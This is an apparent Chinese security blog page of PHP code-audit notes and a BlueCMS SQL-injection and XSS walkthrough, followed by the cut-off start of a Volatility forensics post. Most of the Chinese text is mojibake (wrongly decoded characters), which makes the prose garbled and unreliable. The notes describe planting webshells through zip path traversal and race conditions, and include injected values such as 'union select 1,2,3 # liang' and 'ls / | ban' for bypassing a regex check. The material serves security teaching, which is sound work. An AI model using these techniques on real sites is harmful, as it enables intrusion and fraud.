å’Œ CSRF ç±»ä¼¼ï¼Œéƒ½éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œè€Œ CSRF ä¸»è¦æ˜¯ä»¥ç”¨æˆ·çš„è´¦æˆ·è¿›è¡Œå¢åˆ æ”¹çš„æ“ä½œï¼Œjsonp åˆ™ä¸»è¦ç”¨æ¥åŠ«æŒæ•°æ®ã€‚</p>
<p>Jsonpå€Ÿæ­¤æ¼æ´å¸¸è§ä½ç½®ï¼š<br>
webæ¡†æ¶é»˜è®¤æ”¯æŒajax + jsonpæ–¹å¼è¯·æ±‚<br>
ç¨‹åºå‘˜ä¸»åŠ¨å¼€å‘éœ€è¦æ”¯æŒjsonpçš„åº”ç”¨<br>
JsonpåŠ«æŒé˜²å¾¡ï¼š</p>
<ol>
<li>Refereræ£€æŸ¥</li>
<li>Toke</li>
</ol>
<h2 id="ååºåˆ—åŒ–æ¼æ´"><a class="header-anchor" href="#ååºåˆ—åŒ–æ¼æ´">Â¶</a>ååºåˆ—åŒ–æ¼æ´</h2>
<p>å‡ ä¹æ‰€æœ‰è¯­è¨€éƒ½æœ‰åºåˆ—åŒ–åŠŸèƒ½ï¼Œjavaï¼Œphpï¼Œpythonéƒ½æœ‰ç›¸å…³æ¼æ´<br>
ååºåˆ—åŒ–åˆ†ç±»ï¼š<br>
ååºåˆ—åŒ–è§¦å‘æ‰§è¡Œä»»æ„ä»£ç  -ã€‹python<br>
(pythonçš„ååºåˆ—åŒ–å…¶å®æ˜¯ä¸€é—¨çœŸæ­£çš„è¯­è¨€ï¼Œæ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œæ‰§è¡Œä»£ç çš„)<br>
ååºåˆ—åŒ–åï¼Œé€šè¿‡å·²æœ‰ä»£ç åˆ©ç”¨é“¾ï¼Œé—´æ¥æ‰§è¡Œä»»æ„ä»£ç  -ã€‹ PHP/java</p>
<p>PHPååºåˆ—åŒ–æ³¨æ„å‡½æ•°ï¼š<br>
serializeï¼ˆåºåˆ—åŒ–å‡½æ•°ï¼‰<br>
unserializeï¼ˆååºåˆ—åŒ–å‡½æ•°ï¼‰<br>
PHPååºåˆ—åŒ–ç‰¹ç‚¹ï¼š<br>
å¼•å…¥é™¤èµ„æºå‹å¤–ä»»æ„ç±»å‹å˜é‡<br>
æ— æ³•å¼•å…¥å‡½æ•° -ã€‹ä¸èƒ½ç›´æ¥æ‰§è¡Œä»£ç <br>
è¿‚å›æˆ˜æœ¯<br>
å¯»æ‰¾ç¨‹åºä¸­å¯èƒ½å­˜åœ¨çš„æ¼æ´çš„ç±»<br>
å®ä¾‹åŒ–ç±»å¯¹è±¡ -ã€‹ è§¦å‘æ¼æ´</p>
<p>æ¼æ´æŒ–æ˜è¿‡ç¨‹ï¼š<br>
å¯»æ‰¾è°ƒç”¨ååºåˆ—åŒ–å‡½æ•°çš„ä½ç½®<br>
å¯»æ‰¾åŒ…å«å±é™©æ–¹æ³•çš„ç±»<br>
ååºåˆ—åŒ–ä¸Šä¸‹æ–‡æ˜¯å¦åŒ…å«è¯¥ç±»<br>
åŒ…å«ï¼šç›´æ¥ç”Ÿæˆè¯¥ç±»ï¼Œè§¦å‘æ¼æ´<br>
ä¸åŒ…å«ï¼šå¯»æ‰¾å¼•ç”¨é“¾<br>
æ€ä¹ˆåˆ©ç”¨é“¾ï¼Œæ€ä¹ˆæ„é€ åˆ©ç”¨è¯­å¥ï¼Œè¿˜æœ‰pharååºåˆ—åŒ–ç­‰æœ‰å¾ˆå¤šåé¢å†å†™<br>
å¦‚æœåªæ˜¯è¦æ‰¾ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£ä¹ˆæ‰¾unserializeå°±å¤Ÿäº†</p>
<h2 id="å°æŠ€å·§ç¯‡"><a class="header-anchor" href="#å°æŠ€å·§ç¯‡">Â¶</a>å°æŠ€å·§ç¯‡</h2>
<p>ä»£ç å®¡è®¡æ˜ç™½äº†åŸç†ï¼Œæ˜ç™½äº†å„ç§æ¼æ´çš„ä¿®å¤æ–¹å¼ï¼Œä¹‹åæƒ³è¦æé«˜å°±è¦ä»°ä»—è‡ªå·±ç§¯ç´¯çš„ä¸€äº›å°æŠ€å·§<br>
å› ä¸ºä½ ä¼šå‘ç°é‡åˆ°çš„å¤§éƒ¨åˆ†æœ‰æ¼æ´çš„ä»£ç å‰é¢éƒ½å­˜åœ¨ä¸€äº›è¿‡æ»¤ï¼Œæ£€æŸ¥ï¼›<br>
å¦‚æœä½ çŸ¥é“ä¸€äº›æŠ€å·§åä¼šå‘ç°å¾ˆå¤šè¿‡æ»¤ï¼Œæ£€æŸ¥éƒ½æ˜¯å¯ä»¥ç»•è¿‡çš„</p>
<h3 id="ç°ä»£webå¼€å‘æ¡†æ¶ä¸‹çš„phpæ¼æ´"><a class="header-anchor" href="#ç°ä»£webå¼€å‘æ¡†æ¶ä¸‹çš„phpæ¼æ´">Â¶</a>ç°ä»£webå¼€å‘æ¡†æ¶ä¸‹çš„phpæ¼æ´</h3>
<p>Laravel<br>
symfony<br>
slimphp<br>
Yii2<br>
ç‰¹ç‚¹ï¼š<br>
æ‰€éœ€PHPç‰ˆæœ¬è¾ƒé«˜ï¼Œ\0æˆªæ–­ç­‰è€æ¼æ´ç»è¿¹<br>
æä¾›åŠŸèƒ½å¼ºå¤§çš„ORMï¼ˆå³ä½¿æƒ³å†™å‡ºä¸€ä¸ªsqlæ¼æ´éƒ½éš¾ï¼‰<br>
æä¾›è‡ªåŠ¨å¤„ç†è¾“å‡ºçš„æ¨¡æ¿å¼•æ“ï¼ˆæƒ³å†™å‡ºå‰ç«¯æ¼æ´éƒ½éš¾äº†ï¼Œå› ä¸ºè‡ªå¸¦ä¸€äº›è½¬ä¹‰ï¼Œå®ä½“åŒ–åŠŸèƒ½ï¼‰<br>
å¼€å‘è€…å¯ä»¥é€šè¿‡composeræ‰¾åˆ°ä»»ä½•éœ€è¦çš„åŠŸèƒ½ç±»ï¼Œé¿å…å› ä¸ºè‡ªå·±é€ è½®å­äº§ç”Ÿçš„æ¼æ´<br>
ç°ä»£webå¼€å‘æ¡†æ¶å®‰å…¨æ€æƒ³<br>
Secure by default åŸåˆ™<br>
æ–‡æ¡£ä¸­ï¼Œä¼šè¯¦ç»†å™è¿°å¯èƒ½å‡ºç°çš„å®‰å…¨é—®é¢˜<br>
æŒ–æ˜æ€è·¯<br>
å¯»æ‰¾æ¡†æ¶æœ¬èº«çš„å®‰å…¨æ¼æ´<br>
å¯»æ‰¾ä¸è§„èŒƒçš„å¼€å‘æ–¹å¼<br>
å¯»æ‰¾é”™è¯¯çš„é…ç½®ï¼ˆdebugæ¨¡å¼ï¼Œæ—¥å¿—è®°å½•ç­‰ï¼‰<br>
å¼‚å¸¸çš„åˆ©ç”¨ï¼ˆå¦‚æœå¼€å¯äº†debugæˆ–è€…ä¼šè¾“å‡ºå¼‚å¸¸ï¼Œå¯ä»¥æ„é€ å¼‚å¸¸æŠ›å‡ºæ•æ„Ÿä¿¡æ¯ï¼Œæ–°çš„æ¡†æ¶ç‰¹æœ‰çš„æ¼æ´è€çš„å‡ ä¹æ²¡æœ‰ï¼‰<br>
ç¬¬ä¸‰æ–¹æœåŠ¡åˆ©ç”¨<br>
spl_autoloadçš„åˆ©ç”¨</p>
<h3 id="å‹ç¼©ç‚¸å¼¹ï¼š"><a class="header-anchor" href="#å‹ç¼©ç‚¸å¼¹ï¼š">Â¶</a>å‹ç¼©ç‚¸å¼¹ï¼š</h3>
<p>webåº”ç”¨æ‰§è¡Œäº†è§£å‹ç¼©æ“ä½œ<br>
é»‘å®¢åˆ©ç”¨å‹ç¼©åŒ…çš„ä¸€äº›ç‰¹æ€§ï¼Œæ„é€ &quot;ç•¸å½¢&quot;å‹ç¼©åŒ…<br>
è§£å‹ç¼©æ—¶å°†é€ æˆæ¼æ´</p>
<p>å‹ç¼©ç‚¸å¼¹æƒ¯ç”¨çš„æ–¹å¼<br>
ç»•è¿‡æ–‡ä»¶æ£€æŸ¥å¤±è´¥åçš„åˆ é™¤æ“ä½œ<br>
é˜»æ­¢å‹ç¼©æ—¶çš„æ–‡ä»¶æ£€æŸ¥<br>
ç»•è¿‡å‹ç¼©æ—¶çš„æ–‡ä»¶æ£€æŸ¥<br>
é“¾æ¥æ–‡ä»¶çš„åˆ©ç”¨<br>
ç»•è¿‡æ–‡ä»¶æ£€æŸ¥å¤±è´¥åçš„åˆ é™¤æ“ä½œï¼š<br>
æ¡ˆä¾‹ï¼šä¸Šä¼ å‹ç¼©åŒ…åï¼Œåç«¯å¤„ç†åªèƒ½åˆ é™¤æ–‡ä»¶æ— æ³•åˆ é™¤ç›®å½•ï¼Œå¯¼è‡´shell</p>
<p>é˜»æ­¢å‹ç¼©æ—¶çš„æ–‡ä»¶æ£€æŸ¥<br>
æ¡ˆä¾‹ï¼šå‹ç¼©åŒ…è§£å‹å¤±è´¥ï¼Œç¨‹åºæŠ›å‡ºé”™è¯¯å¹¶åœæ­¢è¿è¡Œ -ã€‹ webshellä¿ç•™<br>
å‹ç¼©åŒ…ä¸‰ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ï¼Œä¸€ä¸ªwebshellï¼Œç¬¬ä¸‰ä¸ªæ–‡ä»¶å‹ç¼©å­˜åœ¨é”™è¯¯<br>
ç»•è¿‡å‹ç¼©æ—¶çš„æ–‡ä»¶æ£€æŸ¥<br>
æ¡ˆä¾‹ï¼šä½¿ç”¨â€¦/è§£å‹åˆ°ä¸Šå±‚ç›®å½•ï¼Œï¼›æ„é€ ä¸€ä¸ªæ–‡ä»¶åä¸ºï¼šâ€¦/â€¦/webshell.phpï¼Œä¼šè®©åç«¯è§£å‹åˆ°ä¸Šå±‚ç›®å½•<br>
è€Œåˆ é™¤æ–‡ä»¶ä¸€èˆ¬æ˜¯åœ¨å½“å‰ç›®å½•é€’å½’åˆ é™¤éæ³•æ–‡ä»¶ï¼Œä¸å¯èƒ½åœ¨æ ¹ç›®å½•é€’å½’<br>
é“¾æ¥æ–‡ä»¶çš„åˆ©ç”¨<br>
åç«¯è§£å‹åæœªåˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå¯¼è‡´å¯ä»¥ä¸Šä¼ è½¯é“¾æ¥æ–‡ä»¶ï¼Œè¯¥è½¯è¿æ¥å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–<br>
å‹ç¼©åŒ…æ˜¯å…è®¸å‹ç¼©è½¯è¿æ¥æ–‡ä»¶ï¼Œä¹Ÿè¿è¡Œè§£å‹è½¯è¿æ¥æ–‡ä»¶ï¼›ä½†æ–‡ä»¶ä¸Šä¼ ä¼ ä¸äº†</p>
<h3 id="æ¡ä»¶ç«äº‰æ¼æ´"><a class="header-anchor" href="#æ¡ä»¶ç«äº‰æ¼æ´">Â¶</a>æ¡ä»¶ç«äº‰æ¼æ´</h3>
<p>æ¡ä»¶ç«äº‰ï¼šwebæœåŠ¡å™¨éƒ½æ˜¯å¤šçº¿ç¨‹çš„ï¼ŒåŒæ—¶è¿è¡Œå¤šäººè®¿é—®ç½‘ç«™ï¼Œç†è®ºæ˜¯äº’ç›¸ä¸å½±å“çš„ï¼Œä½†æ˜¯phpï¼ŒApacheï¼ŒNginxåªèƒ½ä¿è¯phpæ˜¯ä¸äº’ç›¸å½±å“çš„ï¼Œä¸èƒ½ä¿è¯æ–‡ä»¶æˆ–è€…æ•°æ®åº“é“¾æ¥æ˜¯ä¸äº’ç›¸å½±å“çš„</p>
<p>æ¡ä»¶ç«äº‰æ¼æ´æŒ–æ˜æ–¹å‘ï¼š<br>
ä¸Šä¼ ååˆ é™¤çš„åˆ©ç”¨<br>
å¿˜è®°ä¸Šé”çš„æ•°æ®åº“<br>
é¸¡è‚‹æ–‡ä»¶åŒ…å«çš„å¦™ç”¨<br>
ä¸Šä¼ ååˆ é™¤çš„åˆ©ç”¨ï¼š<br>
ä¸Šä¼ å‹ç¼©åŒ…åè§£å‹é€’å½’åˆ é™¤éæ³•æ–‡ä»¶ï¼Œä½†åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¼€å¯å¤šä¸ªçº¿ç¨‹å»è®¿é—®è§£å‹å‡ºæ¥çš„webshellï¼Œå¹¶åœ¨ä¸Šå±‚ç›®å½•å†™å…¥æ–°çš„webshellï¼›æ‰“ä¸€ä¸ªæ—¶é—´å·®ï¼Œåœ¨è¿˜æ²¡åˆ é™¤æ—¶åˆ©ç”¨ï¼ŒæŠŠwebshellè§£å‹å‡ºæ¥åé¢è¿˜æœ‰å…¶ä»–æ–‡ä»¶<br>
å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘æ˜¯åœ¨ä¸Šä¼ äº†åå†åˆ é™¤ï¼ŒåŸºæœ¬ä¸Šå°±ç¡®å®šå­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´</p>
<h3 id="æ²¡ä¸Šé”çš„æ•°æ®åº“"><a class="header-anchor" href="#æ²¡ä¸Šé”çš„æ•°æ®åº“">Â¶</a>æ²¡ä¸Šé”çš„æ•°æ®åº“</h3>
<p>æ¡ˆä¾‹ï¼šå•†åœºæ¼æ´ï¼š<br>
1.æŸ¥è¯¢ç”¨æˆ·ä½™é¢<br>
2.æŸ¥è¯¢è´­ä¹°å•†å“çš„ä»·æ ¼<br>
3.åˆ¤æ–­ç”¨æˆ·ä½™é¢&gt;å•†å“ä»·æ ¼<br>
4.ç”¨æˆ·ä½™é¢=ç”¨æˆ·ä½™é¢ - ä»·æ ¼<br>
å¦‚æœç¬¬ä¸‰æ­¥å’Œç¬¬å››æ­¥æ˜¯å•ç‹¬çš„æ­¥éª¤ï¼Œå¦‚æœç”¨å¤šä¸ªçº¿ç¨‹å»è¯·æ±‚åŒæ—¶èµ°åˆ°äº†ç¬¬ä¸‰æ­¥ï¼Œåˆ¤æ–­éƒ½å¯ä»¥è´­ä¹°<br>
è´­ä¹°å®ŒååŒæ—¶èµ°åˆ°ç¬¬å››æ­¥ååŒæ—¶å‡å»ä»·æ ¼ï¼Œå°±ä¼šå¯¼è‡´ä½™é¢å˜è´Ÿ -ã€‹æˆåŠŸè´­ä¹°å¤šä¸ªå•†å“</p>
<p>é¸¡è‚‹æ–‡ä»¶åŒ…å«åˆ©ç”¨<br>
æ–‡ä»¶åŒ…å«æ¼æ´éœ€è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤ŸåŒ…å«çš„æ¶æ„æ–‡ä»¶ï¼Œä½†ç½‘ç«™æ²¡æœ‰èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œä¹Ÿæ²¡æœ‰æ‰¾åˆ°ä»»ä½•å¯ä»¥æ§åˆ¶çš„æ–‡ä»¶</p>
<p>â€‹	å¯»æ‰¾ä¸´æ—¶æ–‡ä»¶æ³„éœ²ç‚¹ï¼Œæ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œç”¨æˆ·ä¼šå‘é€ä¸€ä¸ªæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¼šå°†æ•°æ®åŒ…é‡Œçš„æ–‡ä»¶ä¿å­˜åˆ°å½“å‰çš„ä¸´æ—¶ç›®å½•ä¸‹ï¼Œå˜æˆ	ä¸´æ—¶æ–‡ä»¶ï¼Œæ–‡ä»¶åéšæœºï¼Œå†…å®¹å¯ä»¥æ§åˆ¶ï¼Œphpinfoå¯ä»¥è·å–æ–‡ä»¶å<br>
â€‹	æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªéå¸¸å¤§çš„æ–‡ä»¶ï¼Œéœ€è¦10ç§’ä¸Šä¼ å®Œæˆï¼Œä¸´æ—¶æ–‡ä»¶ä¸Šä¼ å®Œæˆåæ˜¯ä¼šè¢«åˆ é™¤çš„ï¼Œå†å¼€å¤šä¸ªçº¿ç¨‹å»åŒ…å«è¯¥æ–‡ä»¶ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„webshell</p>
<h1>ä¸€äº›å®¹æ˜“çŠ¯é”™çš„ç‚¹</h1>
<p>header(â€˜404â€™) ä¼šç»™ç”¨æˆ·è¿”å›ä¸€ä¸ªé¡µé¢ï¼Œä½†å¹¶ä¸ä¼šé˜»æ­¢phpè§£é‡Šå™¨ç»§ç»­å¾€ä¸‹è¿è¡Œ</p>
<p>æ­£åˆ™ï¼šåº”è¯¥è¦å†™åˆ¤æ–­åªæœ‰çš„ï¼Œé”™è¯¯å†™æˆåŒ…å«æœ‰ï¼Œé‚£ä¹ˆå°±æœ‰æ¼æ´</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/liang|ban/i&#x27;</span>, $cmd))&#123;</span><br><span class="line">	exit(<span class="string">&quot;é”™è¯¯&quot;</span>)ï¼›</span><br><span class="line">&#125;</span><br><span class="line">cmd = union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment"># liang</span></span><br><span class="line">cmd = ls / | ban</span><br></pre></td></tr></table></figure>
<p>å®ƒä¼šæŸ¥è¯¢ä¼ å…¥çš„è¯­å¥å…¶å®æœ‰DESCå°±ç»•è¿‡äº†ä½†å’ŒDESCä¸€å—çš„æœ‰æˆ‘ä»¬çš„å…¶ä»–å‘½ä»¤</p>
<h1>å°è¯•å®¡è®¡ä»£ç </h1>
<p>admin åå°ç®¡ç†ç›®å½•<br>
install ç½‘ç«™çš„å®‰è£…ç›®å½•<br>
api æ¥å£æ–‡ä»¶ç›®å½•<br>
data ç³»ç»Ÿå¤„ç†æ•°æ®ç›¸å…³ç›®å½•<br>
include ç”¨æ¥åŒ…å«çš„å…¨å±€æ–‡ä»¶<br>
template æ¨¡æ¿<br>
css CSSæ ·å¼è¡¨ç›®å½•<br>
images ç³»ç»Ÿå›¾ç‰‡å­˜æ”¾ç›®å½•<br>
system  ç®¡ç†ç›®å½•<br>
å‡½æ•°é›†æ–‡ä»¶: è¿™ç±»æ–‡ä»¶é€šå¸¸å‘½åä¸­åŒ…å«functionsæˆ–è€…commonç­‰å…³é”®å­—ï¼Œè¿™äº›æ–‡ä»¶é‡Œé¢æ˜¯ä¸€äº›å…¬å…±çš„å‡½æ•°ï¼Œæä¾›ç»™å…¶ä»–æ–‡ä»¶ç»Ÿä¸€è°ƒç”¨ï¼Œæ‰€ä»¥å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šåœ¨æ–‡ä»¶å¤´éƒ¨åŒ…å«åˆ°å®ƒä»¬ï¼Œå¯»æ‰¾è¿™äº›æ–‡ä»¶ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æŠ€å·§å°±æ˜¯å»æ‰“å¼€index.phpæˆ–è€…ä¸€äº›åŠŸèƒ½æ€§æ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨ä¸€èˆ¬éƒ½èƒ½æ‰¾åˆ°ã€‚<br>
é…ç½®æ–‡ä»¶ï¼šè¿™ç±»æ–‡ä»¶é€šå¸¸å‘½åé‡Œé¢åŒ…æ‹¬configè¿™ä¸ªå…³é”®å­—ï¼Œé…ç½®æ–‡ä»¶åŒ…æ‹¬Webç¨‹åºè¿è¡Œå¿…é¡»çš„åŠŸèƒ½æ€§é…ç½®é€‰é¡¹ä»¥åŠæ•°æ®åº“ç­‰é…ç½®ä¿¡æ¯ï¼Œä»è¿™ä¸ªæ–‡ä»¶é‡Œé¢å¯ä»¥äº†è§£ç¨‹åºçš„å°éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦å¤–çœ‹è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™æ³¨æ„è§‚å¯Ÿé…ç½®æ–‡ä»¶ä¸­å‚æ•°å€¼æ˜¯ç”¨å•å¼•å·è¿˜æ˜¯ç”¨çš„åŒå¼•å·åŒ…èµ·æ¥ï¼Œå¦‚æœæ˜¯åŒå¼•å·ï¼Œåˆ™å¾ˆå¤§å¯èƒ½ä¼šå­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚<br>
<a target="_blank" rel="noopener" href="https://github.com/source-trace/bluecms">https://github.com/source-trace/bluecms</a><br>
<img src="https://static.sechelper.com/img/2022/11/22/cdf2b976d9deec5d9c5791dfd06f48d6.png" alt="image.png"><br>
æ ¹æ®æµç¨‹å¡«å®Œä¿¡æ¯ååˆç©ºç™½äº†ï¼Œä½†æ²¡é—®é¢˜å·²ç»å®‰è£…å¥½äº†ï¼Œè®¿é—®index.phpé¡µé¢å°±å¥½<br>
<img src="https://static.sechelper.com/img/2022/11/22/b6a38ff07e2f9a91202ee886c2df5626.png" alt="image.png"><br>
<img src="https://static.sechelper.com/img/2022/11/22/c3a20d6a06a18a4ad0488d2749c563eb.png" alt="image.png"><br>
ä½¿ç”¨Seayå·¥å…·è‡ªåŠ¨æ‰«æä¸€ä¸‹<br>
<img src="https://static.sechelper.com/img/2022/11/22/e57dff2a97d29c0cf63a015c235bb290.png" alt="image.png"><br>
å…ˆçœ‹ç¬¬ä¸€ä¸ªè¯•è¯•<br>
<img src="https://static.sechelper.com/img/2022/11/22/6a221b9e530f29b079434bbe99ce2c5f.png" alt="image.png"><br>
å¯ä»¥çœ‹åˆ°å…ˆæ˜¯åŒ…å«äº†ä¸€ä¸ªcommon.inc.phpçš„æ–‡ä»¶ï¼Œå…¶æ¬¡å¦‚æœæœ‰ad_idå‚æ•°é‚£ä¹ˆä¼šç»è¿‡trimå‡½æ•°çš„å¤„ç†<br>
å†sqlè¯­å¥æ‹¼æ¥æ—¶æ˜¯æ²¡æœ‰å•å¼•å·åŒ…è£¹çš„ï¼Œå¯èƒ½å­˜åœ¨é—®é¢˜<br>
å»çœ‹çœ‹åŒ…å«çš„phpæ–‡ä»¶ã€‚ç²—ç•¥çš„è§‚å¯Ÿä¸€ä¸‹å‘ç°æœ‰å¯¹äº$_GETè¿›è¡Œå¤„ç†<br>
<img src="https://static.sechelper.com/img/2022/11/22/073b8cd2a93569b53610374f79059c11.png" alt="image.png"><br>
if(!get_magic_quotes_gpc())ï¼ŒæŸ¥çœ‹ä¸‹å‡½æ•°æ„æ€<br>
<img src="https://static.sechelper.com/img/2022/11/22/27054eb67d00b559733392f270fc24bb.png" alt="image.png"><br>
å°±æ˜¯ä¸€ç›´æ˜¯trueï¼Œéƒ½ä¼šç»è¿‡è¿™ä¸ªifè¯­å¥é‡Œçš„å¤„ç†ï¼›ifè¯­å¥çš„å¤„ç†è¿½è¸ªä¸€ä¸‹deep_addslashesçœ‹çœ‹<br>
<img src="https://static.sechelper.com/img/2022/11/22/d716b2887e0cb09b6259a9b6af9a124d.png" alt="image.png"><br>
å°±æ˜¯ç»è¿‡äº†addslashesçš„å¤„ç†ï¼Œå†å‰é¢å­¦ä¹ è¿‡è¿™ä¸ªå‡½æ•°å°±æ˜¯å¯¹äºå•å¼•å·åŒå¼•å·åæ–œçº¿å’Œnulè¿›è¡Œè½¬ä¹‰ï¼Œä½†æˆ‘ä»¬sqlè¯­å¥å¹¶æ²¡æœ‰è¢«â€™'å•å¼•å·åŒ…è£¹ï¼Œè¿™ä¸ªè¿‡æ»¤å¯¹äºè¦å®¡è®¡çš„sqlè¯­å¥æ²¡æœ‰ç”¨ï¼›å¸Œæœ›+1<br>
çœ‹å®ŒåŒ…å«çš„å‡½æ•°ååœ¨çœ‹ä¸€ä¸‹trimå‡½æ•°æœ‰æ²¡æœ‰é—®é¢˜åŸºæœ¬ä¸Šå°±ç¡®å®šæœ‰æ²¡æœ‰sqlæ³¨å…¥äº†<br>
ä¹ˆæœ‰å®šä½åˆ°è¿™ä¸ªå‡½æ•°ï¼ŒæŸ¥ä¸‹å®˜æ–¹æ‰‹å†Œå‘ç°æ˜¯ç”¨æ¥å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰\t \n \r \0 \x0B<br>
ä½†åªæ˜¯å»é™¤é¦–ä½çš„ï¼Œè¯­å¥ä¸­é—´çš„å¹¶ä¸ä¼šï¼Œæ‰€ä»¥æ²¡å½±å“ï¼›å¥½ç†è®ºç¡®å®šå­˜åœ¨æ³¨å…¥äº†ï¼Œå®è·µå¼€å§‹<br>
æ²¡æœ‰è¿‡æ»¤æ‰«æsqlè¯­å¥æˆ–è€…å­—æ¯æ•°å­—ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨orderæŸ¥çœ‹ä¸‹å­—æ®µæ•°<br>
<img src="https://static.sechelper.com/img/2022/11/22/b797eff7c8bd77aa6be901b48c39a22a.png" alt="image.png"><br>
å¯ä»¥çœ‹åˆ°æŸ¥åˆ°8æ—¶æŠ¥é”™å¹¶æœ‰è¿”å›è¯´æ˜ç¡®å®å­˜åœ¨æ³¨å…¥ï¼Œä½¿ç”¨è”åˆæ³¨å…¥è¯•ä¸‹<br>
<img src="https://static.sechelper.com/img/2022/11/22/c526c0a9d94a32dbe28b4af6e96b7cec.png" alt="image.png"><br>
å®ƒæ˜¯æ— å›æ˜¾çš„ï¼Œå¯èƒ½è¦ä½¿ç”¨åˆ°æ—¶é—´ç›²æ³¨äº†ï¼Œä½†åœ¨æŸ¥çœ‹åˆ°ç½‘é¡µæºä»£ç æ—¶å‘ç°<img src="https://static.sechelper.com/img/2022/11/22/505e89bd78b1cc95e8ed884b7dc431de.png" alt="image.png">ä¸ç¡®å®šåœ¨è¯•è¯•<img src="https://static.sechelper.com/img/2022/11/22/5fdc083edaa3c242f56ddd8fe4e6a339.png" alt="image.png"><br>
å‘ç°æ˜¯æœ‰å›æ˜¾çš„ï¼Œä½æ•°åœ¨7ï¼Œåœ¨å°è¯•æŸ¥ä¸‹è¡¨ï¼Œå—¯çœ‹æ¥ä»€ä¹ˆéƒ½å¯ä»¥æŸ¥åˆ°<br>
<img src="https://static.sechelper.com/img/2022/11/22/80e6832e66d84abbcf48c8a2c7945742.png" alt="image.png"><br>
æ²¡æœ‰å•å¼•å·ï¼Œå°è¯•ä¸‹xssæ³¨å…¥ï¼›ä¹Ÿæ˜¯å­˜åœ¨çš„<br>
<img src="https://static.sechelper.com/img/2022/11/22/4c56a4854a0ee3300f100eeaf3ecf066.png" alt="image.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/ctf/volatility%E5%8F%96%E8%AF%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20230327/ctf/volatility%E5%8F%96%E8%AF%81/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h3>
<p>volatilityæ˜¯ä¸€æ¬¾å¼€æºçš„å†…å­˜å–è¯åˆ†æå·¥å…·ï¼Œç”±pythonç¼–å†™ï¼Œæ”¯æŒå„ç§æ“ä½œç³»ç»Ÿï¼Œèƒ½å¤Ÿå¯¹å¯¼å‡ºçš„windows,linux,mac osx,androidç­‰ç³»ç»Ÿå†…å­˜é•œåƒè¿›è¡Œåˆ†æã€‚å¯ä»¥é€šè¿‡æ’ä»¶æ¥æ‹“å±•åŠŸèƒ½ã€‚</p>
<p>ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://www.volatilityfoundation.org/26">https://www.volatilityfoundation.org/26</a></p>
<p><img src="https://static.sechelper.com/img/2022/11/26/6e1ebf92f4d996e4310ae735b9f39b9d.png" alt="image-20221126092212037"></p>
<p>å®˜æ–¹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ ¹æ®è‡ªå·±éœ€è¦ä¸‹è½½ã€‚</p>
<h3 id="å¸¸è§å‘½ä»¤"><a class="header-anchor" href="#å¸¸è§å‘½ä»¤">Â¶</a>å¸¸è§å‘½ä»¤</h3>
<p>å‘½ä»¤æ ¼å¼ï¼š</p>
<p>volatility -f [é•œåƒæ–‡ä»¶] --profile=[æ“ä½œç³»ç»Ÿ] [æ’ä»¶å‚æ•°]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 